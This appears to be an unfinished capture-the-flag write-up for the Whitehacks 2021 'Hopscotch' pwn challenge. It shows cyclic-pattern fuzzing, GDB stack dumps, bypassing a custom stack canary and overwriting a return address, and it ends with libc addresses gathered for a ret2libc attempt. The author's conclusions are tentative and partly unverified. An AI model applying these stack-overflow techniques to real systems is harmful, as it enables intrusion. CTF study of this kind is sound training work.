$ file ./hopscotch
./hopscotch: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e41510e41bb8664c4ecd86a046ca8c407262524e, for GNU/Linux 3.2.0, not stripped

$ checksec hopscotch
[*] '/mnt/c/Users/zunmu/Documents/Stuff/Github/Solutions/Cyber Security/Capture the Flag Competitions/2021/Whitehacks 2021/Pwn/Hopscotch/hopscotch'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments


### Random Input Testing

$ ./hopscotch
Buffer: 0x7fffebd60a80
Enter input: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Bad canary!
hacker@HackerBook:/mnt/c/Users/zunmu/Documents/Stuff/Github/Solutions/Cyber Security/Capture the Flag Competitions/2021/Whitehacks 2021/Pwn/Hopscotch$ 1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
-bash: 1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag: command not found
hacker@HackerBook:/mnt/c/Users/zunmu/Documents/Stuff/Github/Solutions/Cyber Security/Capture the Flag Competitions/2021/Whitehacks 2021/Pwn/Hopscotch$

Crashes at 47 characters
$ ./hopscotch
Buffer: 0x7fffdd1f3ba0
Enter input: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4aa
Bad canary!
hacker@HackerBook:/mnt/c/Users/zunmu/Documents/Stuff/Github/Solutions/Cyber Security/Capture the Flag Competitions/2021/Whitehacks 2021/Pwn/Hopscotch$ ./hopscotch
Buffer: 0x7fffc07614a0
Enter input: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4a
$ ltrace ./hopscotch
setvbuf(0x7f8c774ec980, 0, 2, 0)                                                                        = 0
printf("Buffer: %p\n", 0x7fffe16010b0Buffer: 0x7fffe16010b0
)                                                                  = 23
Enter input: fgets(Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab
"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"..., 96, 0x7f8c774ec980)                                        = 0x7fffe16010b0
puts("Bad canary!"Bad canary!
)                                                                                     = 12
exit(-1 <no return ...>
+++ exited (status 255) +++
hacker@HackerBook:/mnt/c/Users/zunmu/Documents/Stuff/Github/Solutions/Cyber Security/Capture the Flag Competitions/2021/Whitehacks 2021/Pwn/Hopscotch$ ltrace ./hopscotch
setvbuf(0x7f559f26c980, 0, 2, 0)                                                                        = 0
printf("Buffer: %p\n", 0x7ffffd19d900Buffer: 0x7ffffd19d900
)                                                                  = 23
Enter input: fgets(Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4A
"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"..., 96, 0x7f559f26c980)                                        = 0x7ffffd19d900
+++ exited (status 0) +++

Basically it crashes on the 47 character onwards when I overwrite the stack canary? I think?

### Debugging in GDB

```
─── Output/messages ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Buffer: 0x7ffffffedd10
0x0000000000401250 in main ()
─── Assembly ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 0x0000000000401250  ? lea    0xdb9(%rip),%rdi        # 0x402010
 0x0000000000401257  ? mov    $0x0,%eax
 0x000000000040125c  ? call   0x401090 <printf@plt>
 0x0000000000401261  ? mov    0x2e08(%rip),%rdx        # 0x404070 <stdin@@GLIBC_2.2.5>
 0x0000000000401268  ? lea    -0x40(%rbp),%rax
 0x000000000040126c  ? mov    $0x60,%esi
 0x0000000000401271  ? mov    %rax,%rdi
 0x0000000000401274  ? call   0x4010a0 <fgets@plt>
 0x0000000000401279  ? movl   $0x8,-0x4(%rbp)
 0x0000000000401280  ? jmp    0x401290 <main+117>
─── Breakpoints ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[1] break at 0x0000000000401223 for main hit 1 time
─── Expressions ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─── History ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─── Memory ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─── Registers ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    rax 0x0000000000000017     rbx 0x0000000000000000     rcx 0x0000000000000000     rdx 0x0000000000000000     rsi 0x00007ffffffeb690        rdi 0x00007fffff7a1670
    rbp 0x00007ffffffedd50     rsp 0x00007ffffffedd10      r8 0x0000000000000000      r9 0x0000000000000017     r10 0x00007ffffffeb51c        r11 0x00007ffffffeb51c
    r12 0x00000000004010d0     r13 0x0000000000000000     r14 0x0000000000000000     r15 0x0000000000000000     rip 0x0000000000401250     eflags [ IF ]
     cs 0x00000033              ss 0x0000002b              ds 0x00000000              es 0x00000000              fs 0x00000000                 gs 0x00000000
─── Source ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─── Stack ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[0] from 0x0000000000401250 in main
─── Threads ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[1] id 1184 name hopscotch from 0x0000000000401250 in main
─── Variables ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
>>> print $rsp-$rbp
$2 = -64
>>> x/64wx $rsp
0x7ffffffedd10: 0xfffedd37      0x00007fff      0x0040130d      0x00000000
0x7ffffffedd20: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffedd30: 0x004012c0      0x00000000      0x004010d0      0x00000000
0x7ffffffedd40: 0x00000539      0x00007fff      0x00000000      0x00000000
0x7ffffffedd50: 0x004012c0      0x00000000      0xff606d0a      0x00007fff
0x7ffffffedd60: 0xfffede48      0x00007fff      0x00000000      0x00000001
0x7ffffffedd70: 0x0040121b      0x00000000      0xff6067cf      0x00007fff
0x7ffffffedd80: 0x00000000      0x00000000      0xd235b3a6      0xb6376a13
0x7ffffffedd90: 0x004010d0      0x00000000      0x00000000      0x00000000
0x7ffffffedda0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffeddb0: 0x4d75b3a6      0x49c8956e      0x2e33b3a6      0x49c89453
0x7ffffffeddc0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffeddd0: 0x00000000      0x00000000      0x00000001      0x00000000
0x7ffffffedde0: 0xfffede48      0x00007fff      0xfffede58      0x00007fff
0x7ffffffeddf0: 0xff7ec180      0x00007fff      0x00000000      0x00000000
0x7ffffffede00: 0x00000000      0x00000000      0x004010d0      0x00000000
>>> x/4wx $rbp
0x7ffffffedd50: 0x004012c0      0x00000000      0xff606d0a      0x00007fff
>>> x/16wx $rsp
0x7ffffffedd10: 0xfffedd37      0x00007fff      0x0040130d      0x00000000
0x7ffffffedd20: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffedd30: 0x004012c0      0x00000000      0x004010d0      0x00000000
0x7ffffffedd40: 0x00000539      0x00007fff      0x00000000      0x00000000
```

From here we can tell that 
1. the value given in the buffer is $rsp
2. the stack is 64 bytes (16 words, 64 characters?)

Running the code more
```
─── Output/messages ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
0x0000000000401279 in main ()
─── Assembly ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 0x0000000000401279  ? movl   $0x8,-0x4(%rbp)
 0x0000000000401280  ? jmp    0x401290 <main+117>
 0x0000000000401282  ? mov    -0x4(%rbp),%eax
 0x0000000000401285  ? cltq
 0x0000000000401287  ? movb   $0x0,-0x40(%rbp,%rax,1)
 0x000000000040128c  ? addl   $0xc,-0x4(%rbp)
 0x0000000000401290  ? mov    -0x4(%rbp),%eax
 0x0000000000401293  ? cmp    $0x2f,%eax
 0x0000000000401296  ? jbe    0x401282 <main+103>
 0x0000000000401298  ? mov    -0x10(%rbp),%eax
─── Breakpoints ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[1] break at 0x0000000000401223 for main hit 1 time
─── Expressions ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─── History ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
$$1 = 0x7ffffffedd10
$$0 = -64
─── Memory ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─── Registers ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    rax 0x00007ffffffedd10     rbx 0x0000000000000000     rcx 0xfffffffffffff28b     rdx 0x0000000000000000     rsi 0x00007fffff79ea03        rdi 0x00007fffff7a1680
    rbp 0x00007ffffffedd50     rsp 0x00007ffffffedd10      r8 0x00007ffffffedd10      r9 0x0000000000000000     r10 0xfffffffffffff28b        r11 0xfffffffffffff28b
    r12 0x00000000004010d0     r13 0x0000000000000000     r14 0x0000000000000000     r15 0x0000000000000000     rip 0x0000000000401279     eflags [ PF IF ]
     cs 0x00000033              ss 0x0000002b              ds 0x00000000              es 0x00000000              fs 0x00000000                 gs 0x00000000
─── Source ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─── Stack ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[0] from 0x0000000000401279 in main
─── Threads ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[1] id 1184 name hopscotch from 0x0000000000401279 in main
─── Variables ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
>>> 1Ad2A
Undefined command: "1Ad2A".  Try "help".
>>> x/64wx $rsp
0x7ffffffedd10: 0x41306141      0x61413161      0x33614132      0x41346141
0x7ffffffedd20: 0x61413561      0x37614136      0x41386141      0x62413961
0x7ffffffedd30: 0x31624130      0x41326241      0x62413362      0x35624134
0x7ffffffedd40: 0x41366241      0x62413762      0x39624138      0x41306341
0x7ffffffedd50: 0x63413163      0x33634132      0x41346341      0x63413563
0x7ffffffedd60: 0x37634136      0x41386341      0x64413963      0x00644130
0x7ffffffedd70: 0x0040121b      0x00000000      0xff6067cf      0x00007fff
0x7ffffffedd80: 0x00000000      0x00000000      0xd235b3a6      0xb6376a13
0x7ffffffedd90: 0x004010d0      0x00000000      0x00000000      0x00000000
0x7ffffffedda0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffeddb0: 0x4d75b3a6      0x49c8956e      0x2e33b3a6      0x49c89453
0x7ffffffeddc0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffeddd0: 0x00000000      0x00000000      0x00000001      0x00000000
0x7ffffffedde0: 0xfffede48      0x00007fff      0xfffede58      0x00007fff
0x7ffffffeddf0: 0xff7ec180      0x00007fff      0x00000000      0x00000000
0x7ffffffede00: 0x00000000      0x00000000      0x004010d0      0x00000000
>>>       
```

Some Observations
1. Not all the input was written to stack, It is only written till `0x64413963`(Little Endian) which is `c9Ad`. `1Ad2A` is not written. We can infer that only 95 characters can be written at most

Running more we get 
```─── Output/messages ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Bad canary!
0x00000000004012ae in main ()
─
```
Which shows that the canary was messed up

### Testing Again
```
─── Output/messages ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4a
0x7ffffffedd10: 0x41306141      0x61413161      0x33614132      0x41346141
0x7ffffffedd20: 0x61413561      0x37614136      0x41386141      0x62413961
0x7ffffffedd30: 0x31624130      0x41326241      0x62413362      0x000a6134
0x7ffffffedd40: 0x00000539      0x00007fff      0x00000000      0x00000000
0x7ffffffedd50: 0x004012c0      0x00000000      0xff606d0a      0x00007fff
0x7ffffffedd60: 0xfffede48      0x00007fff      0x00000000      0x00000001
0x7ffffffedd70: 0x0040121b      0x00000000      0xff6067cf      0x00007fff
0x7ffffffedd80: 0x00000000      0x00000000      0x317a2f2e      0x50c50a53
0x0000000000401279 in main ()
─── Assembly ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 0x0000000000401279  ? movl   $0x8,-0x4(%rbp)
 0x0000000000401280  ? jmp    0x401290 <main+117>
 0x0000000000401282  ? mov    -0x4(%rbp),%eax
 0x0000000000401285  ? cltq
 0x0000000000401287  ? movb   $0x0,-0x40(%rbp,%rax,1)
 0x000000000040128c  ? addl   $0xc,-0x4(%rbp)
 0x0000000000401290  ? mov    -0x4(%rbp),%eax
 0x0000000000401293  ? cmp    $0x2f,%eax
 0x0000000000401296  ? jbe    0x401282 <main+103>
 0x0000000000401298  ? mov    -0x10(%rbp),%eax
─── Breakpoints ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[1] break at 0x0000000000401223 for main hit 1 time
─── Expressions ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─── History ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
$$1 = 0x7ffffffedd10
$$0 = -64
─── Memory ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─── Registers ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    rax 0x00007ffffffedd10     rbx 0x0000000000000000     rcx 0xfffffffffffff28b     rdx 0x0000000000000000     rsi 0x00007fffff79ea03        rdi 0x00007fffff7a1680
    rbp 0x00007ffffffedd50     rsp 0x00007ffffffedd10      r8 0x00007ffffffedd10      r9 0x0000000000000000     r10 0xfffffffffffff28b        r11 0xfffffffffffff28b
    r12 0x00000000004010d0     r13 0x0000000000000000     r14 0x0000000000000000     r15 0x0000000000000000     rip 0x0000000000401279     eflags [ PF IF ]
     cs 0x00000033              ss 0x0000002b              ds 0x00000000              es 0x00000000              fs 0x00000000                 gs 0x00000000
─── Source ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─── Stack ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[0] from 0x0000000000401279 in main
─── Threads ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[1] id 1188 name hopscotch from 0x0000000000401279 in main
─── Variables ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────    
>>> x/s $rsp
0x7ffffffedd10: "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4a\n"
>>> x/s $rsp+16
0x7ffffffedd20: "a5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4a\n"
>>> x/s $rsp+47
0x7ffffffedd3f: ""
>>> x/s $rsp+46
0x7ffffffedd3e: "\n"
>>> x/1wx $rsp+47
0x7ffffffedd3f: 0x00053900
>>>                            
```

─── Output/messages ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x7ffffffedd50: 0x004012c0      0x00000000      0xff606d0a      0x00007fff
0x7ffffffedd60: 0xfffede48      0x00007fff      0x00000000      0x00000001
0x7ffffffedd70: 0x0040121b      0x00000000      0xff6067cf      0x00007fff
0x7ffffffedd80: 0x00000000      0x00000000      0x4378bc04      0xe18be4be
0x7ffffffedd90: 0x004010d0      0x00000000      0x00000000      0x00000000
0x7ffffffedda0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffeddb0: 0xdc38bc04      0x1e741bc3      0xbf7ebc04      0x1e741afe
0x7ffffffeddc0: 0x00000000      0x00000000      0x00000000      0x00000000

─── Output/messages ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x7ffffffedd10: 0x41306141      0x61413161      0x33614132      0x41346141
0x7ffffffedd20: 0x61413561      0x37614136      0x41386141      0x62413961
0x7ffffffedd30: 0x31624130      0x41326241      0x62413362      0x39004134
0x7ffffffedd40: 0x00000005      0x00007fff      0x00000000      0x00000000
0x7ffffffedd50: 0x004012c0      0x00000000      0xff606d0a      0x00007fff
0x7ffffffedd60: 0xfffede48      0x00007fff      0x00000000      0x00000001
0x7ffffffedd70: 0x0040121b      0x00000000      0xff6067cf      0x00007fff
0x7ffffffedd80: 0x00000000      0x00000000      0x4378bc04      0xe18be4be

### Analysis of stack

The stack doesn't change much in terms of the values stored? so maybe it is possible to hardcode the values?
```
0x7ffffffedd10: 0xfffedd37      0x00007fff      0x0040130d      0x00000000
0x7ffffffedd20: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffedd30: 0x004012c0      0x00000000      0x004010d0      0x00000000
0x7ffffffedd40: 0x00000539      0x00007fff      0x00000000      0x00000000
0x7ffffffedd50: 0x004012c0      0x00000000      0xff606d0a      0x00007fff
0x7ffffffedd60: 0xfffede48      0x00007fff      0x00000000      0x00000001
0x7ffffffedd70: 0x0040121b      0x00000000      0xff6067cf      0x00007fff
0x7ffffffedd80: 0x00000000      0x00000000      0x5067dba6      0x0f9aa802
```
0x7ffffffedd10: 0xfffedd37      0x00007fff      0x0040130d      0x00000000
0x7ffffffedd20: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffedd30: 0x004012c0      0x00000000      0x004010d0      0x00000000
0x7ffffffedd40: 0x00000539      0x00007fff      0x00000000      0x00000000
0x7ffffffedd50: 0x004012c0      0x00000000      0xff606d0a      0x00007fff
0x7ffffffedd60: 0xfffede48      0x00007fff      0x00000000      0x00000001
0x7ffffffedd70: 0x0040121b      0x00000000      0xff6067cf      0x00007fff
0x7ffffffedd80: 0x00000000      0x00000000      0x9d7d8f68      0x1e498c77

0x7ffffffedd10: 0xfffedd37      0x00007fff      0x0040130d      0x00000000
0x7ffffffedd20: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffedd30: 0x004012c0      0x00000000      0x004010d0      0x00000000
0x7ffffffedd40: 0xfffede40      0x00007fff      0x00000000      0x00000000
0x7ffffffedd50: 0x004012c0      0x00000000      0xff606d0a      0x00007fff
0x7ffffffedd60: 0xfffede48      0x00007fff      0x00000000      0x00000001
0x7ffffffedd70: 0x0040121b      0x00000000      0xff6067cf      0x00007fff
0x7ffffffedd80: 0x00000000      0x00000000      0xe28a9a5f      0xfbebbaac



0x7ffffffedd10: 0x41306141      0x61413161      0x33614132      0x41346141
0x7ffffffedd20: 0x61413561      0x37614136      0x41386141      0x62413961
0x7ffffffedd30: 0x31624130      0x41326241      0x62413362      0x61624134
0x7ffffffedd40: 0x00000500      0x00007fff      0x00000000      0x00000000
0x7ffffffedd50: 0x004012c0      0x00000000      0xff606d0a      0x00007fff
0x7ffffffedd60: 0xfffede48      0x00007fff      0x00000000      0x00000001
0x7ffffffedd70: 0x0040121b      0x00000000      0xff6067cf      0x00007fff
0x7ffffffedd80: 0x00000000      0x00000000      0x8590def6      0xbd80b950

Use a Python script to overwrite until the needed position, and write back the needed value (so that it doesn't get tampered with)

### Arbituary code execution baby

This is a good sign
```
$ python solve.py
[+] Starting local process './hopscotch': pid 1304
(u'Buffer: 0x7ffff32724e0\nEnter input:', '\n', u'0x7ffff32724e0')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA9\x05\x00AAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0

[*] Switching to interactive mode
[*] Process './hopscotch' stopped with exit code -11 (SIGSEGV) (pid 1304)
[*] Got EOF while reading in interactive
$
[*] Got EOF while sending in interactive
```

```
─── Output/messages ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

Program received signal SIGSEGV, Segmentation fault.
0x7ffffffedd58: 0x33614132      0x41346141      0x61413561      0x37614136
0x7ffffffedd68: 0x41386141      0x00413961      0x0040121b      0x00000000
0x7ffffffedd78: 0xff6067cf      0x00007fff      0x00000000      0x00000000
0x7ffffffedd88: 0xba7d7f1a      0xb01dfc55      0x004010d0      0x00000000
0x7ffffffedd98: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffedda8: 0x00000000      0x00000000      0x253d7f1a      0x4fe20328
0x7ffffffeddb8: 0x467b7f1a      0x4fe20215      0x00000000      0x00000000
0x7ffffffeddc8: 0x00000000      0x00000000      0x00000000      0x00000000
0x00000000004012be in main ()
─── Assembly ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 0x00000000004012be  ? ret
 0x00000000004012bf  ? nop
 0x00000000004012c0  ? endbr64
 0x00000000004012c4  ? push   %r15
 0x00000000004012c6  ? lea    0x2b43(%rip),%r15        # 0x403e10
 0x00000000004012cd  ? push   %r14
 0x00000000004012cf  ? mov    %rdx,%r14
 0x00000000004012d2  ? push   %r13
 0x00000000004012d4  ? mov    %rsi,%r13
 0x00000000004012d7  ? push   %r12
─── Breakpoints ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[2] break at 0x0000000000401261 for *0x0000000000401261 hit 1 time
─── Expressions ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─── History ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
$$0 = 140737484081815
─── Memory ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─── Registers ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    rax 0x0000000000000000     rbx 0x0000000000000000     rcx 0xfffffffffffff28b     rdx 0x0000000000000000     rsi 0x00007fffff79ea03        rdi 0x00007fffff7a1680
    rbp 0x6141316141306141     rsp 0x00007ffffffedd58      r8 0x00007ffffffedd10      r9 0x0000000000000000     r10 0xfffffffffffff28b        r11 0xfffffffffffff28b
    r12 0x00000000004010d0     r13 0x0000000000000000     r14 0x0000000000000000     r15 0x0000000000000000     rip 0x00000000004012be     eflags [ PF ZF TF IF RF ]
     cs 0x00000033              ss 0x0000002b              ds 0x00000000              es 0x00000000              fs 0x00000000                 gs 0x00000000
─── Source ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─── Stack ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[0] from 0x00000000004012be in main
─── Threads ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[1] id 1306 name hopscotch from 0x00000000004012be in main
─── Variables ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
>>>                                                                                                                                                                                                                          
```

On stepping through code, you noticve the rip value is on the stack, so overwrite it
```
─── Memory ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─── Registers ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    rax 0x0000000000000000     rbx 0x0000000000000000     rcx 0x00000000fbad20ab     rdx 0x0000000000000000     rsi 0x00007fffff79ea03        rdi 0x0000000000000000
    rbp 0x0000000000401200     rsp 0x00007ffffffedd60      r8 0x00007ffffffedd10      r9 0x0000000000000000     r10 0xfffffffffffff28b        r11 0xfffffffffffff28b
    r12 0x00000000004010d0     r13 0x0000000000000000     r14 0x0000000000000000     r15 0x0000000000000000     rip 0x00007fffff606d0c     eflags [ PF ZF IF ]
     cs 0x00000033              ss 0x0000002b              ds 0x00000000              es 0x00000000              fs 0x00000000                 gs 0x00000000
─── Source ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Cannot display "libc-start.c"
```

Tried executing from stack but doesn't work?

### Ret2libc

because I'm not skilled enough for ROP
```
>>> p system
$3 = {int (const char *)} 0x7fffff628e50 <__libc_system>
>>> p exit
$4 = {void (int)} 0x7fffff61e660 <__GI_exit>
>>>                       
```                                           